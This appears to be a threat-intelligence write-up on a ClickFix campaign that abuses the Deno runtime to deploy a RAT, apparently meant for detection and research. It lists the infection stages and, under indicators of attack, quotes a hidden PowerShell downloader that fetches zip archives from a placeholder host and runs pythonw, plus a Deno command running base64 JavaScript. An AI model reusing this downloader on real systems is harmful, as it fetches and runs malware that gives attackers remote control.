# Attack flow
**Stage 1:** Clickfix Attack  
**Stage 2:** msiexec.exe (.msi file) -> wscript.exe (.vbs file) -> powershell.exe (.ps1) -> curl.exe (download deno app) -> tar.exe (unzip)  
**Stage 3:** Deno.exe (c2 connection) -> cmd.exe -> powershell.exe (c2 connection)  
**Stage 4:** pythonw.exe  
**Stage 5:** RAT palyoads 

# IoA  
**Stage 3:** Using Deno as a Trojan horse to execute obfuscated JavaScript code
```
C:\Users\{Username}\.deno\bin\deno.exe" -A data:application/javascript;base64,{string}==
```
```
C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -NonInteractive -NoProfile -OutputFormat Text -Command "$ProgressPreference = 'SilentlyContinue'; $charsArray = \"abcdefghijkmnopqrstuvwxyzABCEFGHJKLMNPQRSTUVWXYZ0123456789!\";$randomObject = New-Object System.Random;$randomString = \"\";for ($i = 0; $i -lt 10; $i++) {$randomIndex = $randomObject.Next(0, $charsArray.Length);$randomCharacter = $charsArray[$randomIndex];$randomString += $randomCharacter;}$PathArch = \"C:\ProgramData\$randomString.zip\";$PythonDir = \"C:\ProgramData\$randomString\";$charsArray = \"abcdefghijkmnopqrstuvwxyzABCEFGHJKLMNPQRSTUVWXYZ0123456789!\";$randomObject = New-Object System.Random;$randomString = \"\";for ($i = 0; $i -lt 10; $i++) {$randomIndex = $randomObject.Next(0, $charsArray.Length);$randomCharacter = $charsArray[$randomIndex];$randomString += $randomCharacter;};$PathArch2 = $PythonDir + \"2.zip\";$WebRequest = New-Object System.Net.WebClient;$PathMyScript = \"\"\"$PythonDir\__init__.py\"\"\";$PathPythonExe = \"$PythonDir\pythonw.exe\";mkdir $PythonDir; $Data = $WebRequest.DownloadData(\"http://{IP/Domain}/{Filename}.zip\");[System.IO.File]::WriteAllBytes($PathArch,$Data);Expand-Archive $PathArch -DestinationPath $PythonDir;$Data = $WebRequest.DownloadData(\"http://1{IP/Domain}/{Filename}.zip\");[System.IO.File]::WriteAllBytes($PathArch2,$Data);Expand-Archive $PathArch2 -DestinationPath $PythonDir;Start-Process $PathPythonExe -ArgumentList $PathMyScript;"
```

# References
[1] https://www.threatdown.com/blog/castlerat-cyber-attack-is-the-first-to-abuse-deno-javascript-runtime-to-evade-enterprise-security/  
[2] https://www.virustotal.com/gui/file/2a00705cfd3c15cf8913e9eb4e23968efd06f1feceaef9987d26c5518887d043/behavior  
[3] https://app.any.run/tasks/2aea5a2b-8896-491e-aa0c-a0775838a3cc/  
[4] https://app.any.run/tasks/aa9f2f55-72f5-4a00-a2f7-234a36461b8a/   
[5] https://app.any.run/tasks/2f7b7468-ed4d-4075-9d75-4d512ccd4fed/  
